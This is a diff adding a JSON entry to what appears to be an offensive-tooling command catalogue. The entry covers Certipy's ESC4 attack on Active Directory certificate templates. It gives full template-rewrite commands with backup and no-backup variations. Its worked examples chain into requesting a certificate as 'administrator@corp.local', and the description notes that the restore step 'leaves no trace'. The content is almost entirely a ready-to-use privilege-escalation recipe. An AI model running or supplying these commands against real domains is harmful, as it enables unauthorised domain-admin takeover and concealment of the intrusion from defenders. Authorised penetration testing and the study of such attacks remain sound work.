@@ -1,0 +1,22 @@
+{
+  "id": "certipy-template",
+  "name": "Certipy Template Edit (ESC4)",
+  "command": "certipy template -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -template '<template>' -write-default-configuration -save-configuration '<template>.json'",
+  "description": "ESC4: when you have GenericWrite/WriteOwner over a template, rewrite its security descriptor / flags to make it ESC1-style vulnerable, then restore the original. -save-configuration takes a backup before modifying so cleanup leaves no trace. Verified against Certipy v5.x parser.",
+  "platform": "linux",
+  "requires": ["password"],
+  "protocols": ["ldap"],
+  "tags": ["certipy", "adcs", "esc4", "template", "writeowner", "genericwrite"],
+  "variations": [
+    { "label": "Restore From Backup", "requires": "password", "command": "certipy template -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -template '<template>' -write-configuration '<template>.json'" },
+    { "label": "No Backup", "requires": "password", "command": "certipy template -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -template '<template>' -write-default-configuration -no-save" }
+  ],
+  "references": [
+    { "title": "Certipy README", "url": "https://github.com/ly4k/Certipy" }
+  ],
+  "examples": [
+    "certipy template -u 'jdoe@corp.local' -p 'Password123!' -dc-ip 10.10.10.10 -template 'WebServer' -write-default-configuration -save-configuration WebServer.json",
+    "certipy req -u 'jdoe@corp.local' -p 'Password123!' -dc-ip 10.10.10.10 -ca 'CORP-CA' -template 'WebServer' -upn 'administrator@corp.local'",
+    "certipy template -u 'jdoe@corp.local' -p 'Password123!' -dc-ip 10.10.10.10 -template 'WebServer' -write-configuration WebServer.json"
+  ]
+}
